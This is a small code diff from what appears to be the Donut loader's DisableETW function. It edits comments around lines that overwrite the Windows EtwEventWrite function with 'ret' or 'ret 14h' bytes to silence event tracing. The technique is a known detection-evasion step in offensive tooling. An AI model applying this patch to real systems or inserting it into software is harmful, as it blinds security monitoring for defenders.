@@ -394,7 +394,7 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
     DPRINT("Overwriting EtwEventWrite");
 
-    // over write with virtual address of stub
+    // over write with "ret"
     Memcpy(cs, "\xc3", 1);
 
     // set memory back to original protection
@@ -406,7 +406,7 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
     DPRINT("Overwriting EtwEventWrite");
 
-    // over write with virtual address of stub
+    // over write with "ret 14h"
     Memcpy(cs, "\xc2\x14\x00\x00", 4);
 
     // set memory back to original protection
